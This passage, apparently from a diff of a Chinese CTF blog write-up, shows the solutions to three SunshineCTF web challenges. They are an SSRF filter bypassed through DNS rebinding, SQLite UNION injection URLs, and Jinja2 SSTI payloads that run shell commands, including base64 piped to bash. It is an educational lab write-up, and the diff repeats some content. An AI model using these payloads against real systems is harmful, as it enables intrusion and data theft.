+</span></span><span style=display:flex><span>    webhook_id <span style=color:#f92672>=</span> str(uuid<span style=color:#f92672>.</span>uuid4())
+</span></span><span style=display:flex><span>    registered_webhooks[webhook_id] <span style=color:#f92672>=</span> url
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;status&#39;</span>: <span style=color:#e6db74>&#39;registered&#39;</span>, <span style=color:#e6db74>&#39;url&#39;</span>: url, <span style=color:#e6db74>&#39;id&#39;</span>: webhook_id}), <span style=color:#ae81ff>200</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/trigger&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>trigger_webhook</span>():
+</span></span><span style=display:flex><span>    webhook_id <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;id&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> webhook_id:
+</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>400</span>, <span style=color:#e6db74>&#39;Missing webhook id&#39;</span>)
+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> registered_webhooks<span style=color:#f92672>.</span>get(webhook_id)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> url:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;Webhook not found&#39;</span>}), <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span>    allowed, reason <span style=color:#f92672>=</span> is_ip_allowed(url)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> allowed:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: reason}), <span style=color:#ae81ff>400</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>, allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;url&#39;</span>: url, <span style=color:#e6db74>&#39;status&#39;</span>: resp<span style=color:#f92672>.</span>status_code, <span style=color:#e6db74>&#39;response&#39;</span>: resp<span style=color:#f92672>.</span>text}), resp<span style=color:#f92672>.</span>status_code
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;url&#39;</span>: url, <span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;something went wrong&#39;</span>}), <span style=color:#ae81ff>500</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;listening on port 5000&#39;</span>)
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
+</span></span></code></pre></div><p>5001端口绑定了提供flag的服务，5000端口提供正常的web服务，思路是通过<code>/register</code>路由注册url，再通过<code>/trigger</code>路由打SSRF，但是对于<code>is_ip_allowed</code>对于url的限制很严格，简单来看就是过滤了本地ip，同时<code>/trigger</code>路由不允许重定向，无法使用自己的vps搭建的网页中的恶意javascript进行fetch，利用DNS重绑定来绕过：<code>http://08080808.7f000001.rbndr.us:5001/flag</code></p><p>由于服务器设置的是随机返回第一个或第二个ip，需要多trigger几次：</p><pre tabindex=0><code>{&#34;response&#34;:&#34;sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}&#34;,&#34;status&#34;:200,&#34;url&#34;:&#34;http://08080808.7f000001.rbndr.us:5001/flag&#34;}
+</code></pre><p>参考资料：</p><p><a href=https://docs.python.org/zh-cn/3/howto/ipaddress.html>https://docs.python.org/zh-cn/3/howto/ipaddress.html</a></p><p><a href=https://lock.cmpxchg8b.com/rebinder.html>https://lock.cmpxchg8b.com/rebinder.html</a></p><h2 id=lunar-shop>Lunar Shop<a hidden class=anchor aria-hidden=true href=#lunar-shop>#</a></h2><p>SQLite注入，注入点为<code>product_id</code>：</p><pre tabindex=0><code>https://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20--+
 
 https://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,flag%20from%20flag%20--+
-</code></pre><p>sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}</p>
-<h2 id="web-forge">Web Forge<a hidden class="anchor" aria-hidden="true" href="#web-forge">#</a></h2>
-<p>robots.txt：</p>
-<pre tabindex="0"><code>User-agent: *
+</code></pre><p>sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}</p><h2 id=web-forge>Web Forge<a hidden class=anchor aria-hidden=true href=#web-forge>#</a></h2><p>robots.txt：</p><pre tabindex=0><code>User-agent: *
 Disallow: /admin
 Disallow: /fetch
 
 # internal SSRF testing tool requires special auth header to be set to &#39;true&#39;
-</code></pre><p>使用<code>ffuf</code>进行header的fuzz：</p>
-<pre tabindex="0"><code>ffuf -u https://wormhole.sunshinectf.games/fetch -H &#34;FUZZ: true&#34; -w uppercase-headers.txt -mc 200
+</code></pre><p>使用<code>ffuf</code>进行header的fuzz：</p><pre tabindex=0><code>ffuf -u https://wormhole.sunshinectf.games/fetch -H &#34;FUZZ: true&#34; -w uppercase-headers.txt -mc 200
 ALLOW                   [Status: 200, Size: 5252, Words: 1498, Lines: 210, Duration: 1630ms]
-</code></pre><p>找到了访问<code>/fetch</code>服务的header：<code>ALLOW</code>，置为true，尝试对<code>/admin</code>进行SSRF工具测试：</p>
-<pre tabindex="0"><code>url=http://127.0.0.1/admin
+</code></pre><p>找到了访问<code>/fetch</code>服务的header：<code>ALLOW</code>，置为true，尝试对<code>/admin</code>进行SSRF工具测试：</p><pre tabindex=0><code>url=http://127.0.0.1/admin
 
 You&#39;re trying to access /admin but forgot the ?template= parameter
-</code></pre><p>猜测是SSTI，但是尝试SSTI检测报错：</p>
-<pre tabindex="0"><code>url=http://127.0.0.1/admin?template={{7*7}}
+</code></pre><p>猜测是SSTI，但是尝试SSTI检测报错：</p><pre tabindex=0><code>url=http://127.0.0.1/admin?template={{7*7}}
 
 HTTPConnectionPool(host=&#39;127.0.0.1&#39;, port=80): Max retries exceeded with url: /admin?template={{7*7}}
  (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x711fb7667130&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;)
-</code></pre><p>无法正常连接到服务，猜测不是80端口，利用<code>BurpSuite</code>来爆破出端口8000，常规的SSTI利用无回显，直接上一个能绕过比较多过滤的payload：</p>
-<pre tabindex="0"><code>url=http://127.0.0.1:8000/admin?template={{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;whoami&#39;)|attr(&#39;read&#39;)()}}
-</code></pre><p>但是同样无法执行cat等文件读取的命令，使用base64编解码绕过：</p>
-<pre tabindex="0"><code>url=http://127.0.0.1:8000/admin?template={{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;echo+Y2F0IGZsYWcudHh0|base64+-d|bash&#39;)|attr(&#39;read&#39;)()}}
-</code></pre><p>sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}</p>
-<p>参考资料：</p>
-<p><a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">https://onsecurity.io/article/server-side-template-injection-with-jinja2/</a></p>
-
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
+</code></pre><p>无法正常连接到服务，猜测不是80端口，利用<code>BurpSuite</code>来爆破出端口8000，常规的SSTI利用无回显，直接上一个能绕过比较多过滤的payload：</p><pre tabindex=0><code>url=http://127.0.0.1:8000/admin?template={{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;whoami&#39;)|attr(&#39;read&#39;)()}}
+</code></pre><p>但是同样无法执行cat等文件读取的命令，使用base64编解码绕过：</p><pre tabindex=0><code>url=http://127.0.0.1:8000/admin?template={{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;echo+Y2F0IGZsYWcudHh0|base64+-d|bash&#39;)|attr(&#39;read&#39;)()}}
+</code></pre><p>sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}</p><p>参考资料：</p><p><a href=https://onsecurity.io/article/server-side-template-injection-with-jinja2/>https://onsecurity.io/article/server-side-template-injection-with-jinja2/</a></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
